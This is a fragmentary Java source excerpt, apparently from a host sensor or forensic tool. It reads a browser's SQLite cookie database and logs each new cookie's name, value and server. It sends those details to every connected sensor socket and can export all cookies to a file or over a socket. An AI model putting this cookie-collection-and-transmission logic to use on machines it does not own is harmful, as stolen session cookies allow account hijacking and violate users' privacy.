...
public class Cookie_Container_Host_System 
{
	...
	public static volatile boolean auto_update_cookies = false;
	...
	public static volatile LinkedList<Cookie_Object_Host_System> list_COOKIES = new LinkedList<Cookie_Object_Host_System>();
	
	public volatile String key = "";
	
	public volatile static boolean update_required = false;
...
//					driver.directive(col_name);
		...
		catch(Exception e)
		{
			try
			{
				if(e.getLocalizedMessage().toLowerCase().contains("busy") || e.getLocalizedMessage().toLowerCase().contains("locked"))
				{
					...
					try	{	if(connection != null) connection.close();	}	catch(Exception eee){}
			...
			driver.eop(myClassName, "enumerate_sqllite_cookie_db_file", e, false);
		}
	...
	public boolean process_cookie(Cookie_Object_Host_System cookie)
	{
		try
		{
			if(cookie == null)
			...
			key = cookie.cookie_name + "_" + cookie.cookie_value + "_" + cookie.web_server;
			
			if(!Cookie_Object_Host_System.tree_COOKIE.containsKey(key))
			{
				//
				//link!
				//
				Cookie_Object_Host_System.tree_COOKIE.put(key, cookie);
				update_required = true;
				
				//
				//transmit
				//
				transmit_cookie(cookie);
				
				//
				//notify
				//
				driver.sop("\nNew cookie detected: \n\tCookie Server: " + cookie.web_server + "\n\tCookie Name: " + cookie.cookie_name + "\n\tCookie Value: " + cookie.cookie_value);
			}
		...
		{
			driver.eop(myClassName, "process_cookie", e);
		}
		
		return false;
	}
	
	public static boolean transmit_cookie(Cookie_Object_Host_System cookie)
	{
		try
		{
			if(ThdSensorSocket.ALL_CONNECTIONS == null || ThdSensorSocket.ALL_CONNECTIONS.isEmpty())
				return false;
			
			for(ThdSensorSocket socket : ThdSensorSocket.ALL_CONNECTIONS)
			{
				socket.send(cookie.get_display_data("\t", true));
			}
		...
		{
			driver.eop(myClassName, "transmit_cookie", e);
		}
	...
	public static boolean update_cookies_host_system(boolean notify_user_of_empty_cookies)
	{
		try
		{			
			//now, instead of clearing all entries each time, let's just add the new cookies by exception
			...
			*/
			...
			if(driver.isWindows)
			{
				...
				{ 
					...
					list_COOKIES = (LinkedList<Cookie_Object_Host_System>)Cookie_Object_Host_System.tree_COOKIE.values();
				}	
				catch(Exception e)
				{
					list_COOKIES = new LinkedList<Cookie_Object_Host_System>(Cookie_Object_Host_System.tree_COOKIE.values());					
				}				
				...
				try
				{
					Collections.sort(list_COOKIES, new Comparator<Cookie_Object_Host_System>()
					{
	...
	public static String export_cookies(boolean open_upon_completion, String delimiter)
	{
		try
		{
			...
			//write data!
			for(Cookie_Object_Host_System cookie : list_COOKIES)
			{
				if(cookie == null)
					continue;
	...
	public static boolean export_cookies_via_socket(ThdSensorSocket socket, String delimiter)
	{
		try
		{
			delimiter = delimiter + " "; 
